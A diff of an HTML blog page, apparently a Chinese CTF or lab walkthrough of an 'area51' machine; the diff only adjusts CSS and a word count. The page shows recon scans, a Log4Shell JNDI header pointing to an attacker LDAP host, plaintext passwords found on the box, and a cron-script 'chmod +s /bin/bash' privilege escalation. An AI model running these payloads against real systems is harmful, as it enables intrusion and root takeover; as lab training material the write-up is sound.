@@ -234,14 +234,14 @@ function checkNightMode() {
   </ul>
 </nav>
       <h2 id="主机发现">主机发现</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo arp-scan -I ens33 -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo arp-scan -I ens33 -l
 </span></span><span style="display:flex;"><span>Interface: ens33, type: EN10MB, MAC: 00:0c:29:a1:f0:49, IPv4: 192.168.89.15
 </span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>192.168.89.13   08:00:27:96:66:e2       PCS Systemtechnik GmbH
 </span></span><span style="display:flex;"><span>192.168.89.99   f6:39:4a:3d:95:18       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>192.168.89.247  ca:a7:78:4d:50:e1       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
 </span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-16 07:34 EDT
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.89.13
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0025s latency<span style="color:#f92672">)</span>.
@@ -272,7 +272,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.70 seconds
 </span></span></code></pre></div><h2 id="web_80">web_80</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace whatweb 192.168.89.13
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace whatweb 192.168.89.13
 </span></span><span style="display:flex;"><span>http://192.168.89.13 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.51<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.51 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>192.168.89.13<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>2.1.3<span style="color:#f92672">]</span>, PasswordField, Script, Title<span style="color:#f92672">[</span>FBI Access<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>~/workspace whatweb 192.168.89.13:8080
 </span></span><span style="display:flex;"><span>http://192.168.89.13:8080 <span style="color:#f92672">[</span><span style="color:#ae81ff">400</span> Bad Request<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>192.168.89.13<span style="color:#f92672">]</span>
@@ -290,7 +290,7 @@ function checkNightMode() {
 
 
 就是个js</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>var working <span style="color:#f92672">=</span> false;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>var working <span style="color:#f92672">=</span> false;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">$(</span><span style="color:#e6db74">&#39;.login&#39;</span><span style="color:#66d9ef">)</span>.on<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">function</span><span style="color:#f92672">(</span>e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>  e.preventDefault<span style="color:#f92672">()</span>;
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>working<span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span>;
@@ -310,7 +310,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>, 3000<span style="color:#f92672">)</span>;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">})</span>;
 </span></span></code></pre></div><p>扫一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  sudo gobuster dir  -u <span style="color:#e6db74">&#39;http://192.168.89.13/&#39;</span> -w ./directory-list-2.3-medium.txt -r -t <span style="color:#ae81ff">50</span>  -x txt,js,html,php  2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  sudo gobuster dir  -u <span style="color:#e6db74">&#39;http://192.168.89.13/&#39;</span> -w ./directory-list-2.3-medium.txt -r -t <span style="color:#ae81ff">50</span>  -x txt,js,html,php  2&gt;/dev/null
 </span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
 </span></span><span style="display:flex;"><span>Gobuster v3.6
 </span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
@@ -334,7 +334,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>/script.js            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 525<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>/radar                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 730<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>/note.txt             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 119<span style="color:#f92672">]</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace curl 192.168.89.13/note.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace curl 192.168.89.13/note.txt
 </span></span><span style="display:flex;"><span>Alert!
 </span></span><span style="display:flex;"><span>We have a vulnerability in our java application...
 </span></span><span style="display:flex;"><span>Notify the programming department to check Log4J.
@@ -363,7 +363,7 @@ function checkNightMode() {
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  nikto -url http://192.168.89.13:8080
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  nikto -url http://192.168.89.13:8080
 </span></span><span style="display:flex;"><span>- Nikto v2.5.0
 </span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
 </span></span><span style="display:flex;"><span>+ Target IP:          192.168.89.13
@@ -388,7 +388,7 @@ function checkNightMode() {
 <p>去搜一下log4j的漏洞吧
 <code>https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell#log4shell-vulnerability</code></p>
 <p>amazing, 使用这个请求头去查询, 就能得到不一样的响应</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>~/workspace curl 192.168.89.13:8080 -H <span style="color:#e6db74">&#39;X-Api-Version:11 &#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>~/workspace curl 192.168.89.13:8080 -H <span style="color:#e6db74">&#39;X-Api-Version:11 &#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Hello, world!#
 </span></span></code></pre></div><p>使用discovery的payload没成功外带
@@ -422,7 +422,7 @@ function checkNightMode() {
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ip a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ip a
 </span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
 </span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 </span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
@@ -432,7 +432,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
 </span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
 </span></span></code></pre></div><p>接触到了一个新的工具, fscan, 常见的内网扫描工具</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./fscan -h 172.17.0.2/16
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./fscan -h 172.17.0.2/16
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>   ___                              _
 </span></span><span style="display:flex;"><span>  / _ <span style="color:#ae81ff">\ </span>    ___  ___ _ __ __ _  ___| | __
@@ -455,10 +455,10 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.1         code:200 len:1131   title:FBI Access
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.1:8080    code:400 len:277    title:None
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.2:8080    code:400 len:277    title:None
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://172.17.0.1:8080 -H <span style="color:#e6db74">&#39;X-Api Version:${jndi:ldap://192.168.68.99:1389/a}&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://172.17.0.1:8080 -H <span style="color:#e6db74">&#39;X-Api Version:${jndi:ldap://192.168.68.99:1389/a}&#39;</span>
 </span></span></code></pre></div><p>好吧, 这样子好像不行, 之后回过来想想</p>
 <h2 id="枚举">枚举</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/tmp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/tmp
 </span></span><span style="display:flex;"><span>ls -al
 </span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
 </span></span><span style="display:flex;"><span>drwxrwxrwt    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .
@@ -467,7 +467,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>cat .roger
 </span></span><span style="display:flex;"><span>b3st4l13n
 </span></span></code></pre></div><h2 id="ssh登录靶机">ssh登录靶机</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:~$ ls -al
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:~$ ls -al
 </span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
 </span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> roger roger <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .
 </span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root  root  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
@@ -513,7 +513,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>  FLAG <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>ee11cbb19052e40b07aac0ca060c23ee<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>roger@area51:~$
 </span></span></code></pre></div><h2 id="枚举-1">枚举</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/opt$ find / -type f -name <span style="color:#e6db74">&#34;.*&#34;</span> 2&gt;/dev/null | grep -v  sys
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/opt$ find / -type f -name <span style="color:#e6db74">&#34;.*&#34;</span> 2&gt;/dev/null | grep -v  sys
 </span></span><span style="display:flex;"><span>/etc/skel/.bash_logout
 </span></span><span style="display:flex;"><span>/etc/skel/.profile
 </span></span><span style="display:flex;"><span>/etc/skel/.bashrc
@@ -530,7 +530,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>/home/roger/.profile
 </span></span><span style="display:flex;"><span>/home/roger/.bashrc
 </span></span><span style="display:flex;"><span>roger@area51:/opt$
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/etc/skel$ cat /etc/passwd | grep bash
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/etc/skel$ cat /etc/passwd | grep bash
 </span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
 </span></span><span style="display:flex;"><span>roger:x:1001:1001:,,,:/home/roger:/bin/bash
 </span></span><span style="display:flex;"><span>kang:x:1000:1000:,,,:/kang:/bin/bash
@@ -540,7 +540,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>k4ng1sd4b3st
 </span></span><span style="display:flex;"><span>roger@area51:/etc/skel$
 </span></span></code></pre></div><h2 id="横向移动">横向移动</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kang@area51:~$ ls -al
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kang@area51:~$ ls -al
 </span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
 </span></span><span style="display:flex;"><span>drwxrwx---  <span style="color:#ae81ff">3</span> kang kang <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">19</span> 22:56 .
 </span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
@@ -551,7 +551,7 @@ function checkNightMode() {
 </span></span></code></pre></div><p>weComeInPeace. sh这个文件有时出现有时没有&hellip;&hellip;&hellip;.. 这肯定是key</p>
 <h2 id="利用定时任务提权">利用定时任务提权</h2>
 <p>上pspy试试,有个script. sh</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>      | /sbin/init
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>      | /sbin/init
 </span></span><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7132</span>   | /bin/sh /root/script.sh
 </span></span><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7133</span>   | sleep <span style="color:#ae81ff">1</span>
 </span></span><span style="display:flex;"><span>2024/04/19 22:58:19 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7134</span>   | /bin/sh /root/script.sh
@@ -560,10 +560,10 @@ function checkNightMode() {
 </span></span></code></pre></div><p>使用下面的payload</p>
 <p><code>for i in {1..10000}; do echo 'chmod +s /bin/bash' &gt;&gt; weComeInPeace.sh; done</code></p>
 <p>然后就获得了suid的bash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# ls -al /bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# ls -al /bin/bash
 </span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Aug  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> /bin/bash
 </span></span></code></pre></div><h2 id="root">root</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# cd /root
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# cd /root
 </span></span><span style="display:flex;"><span>bash-5.1# ls -al
 </span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
 </span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .
@@ -796,7 +796,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 129194 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 129185 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
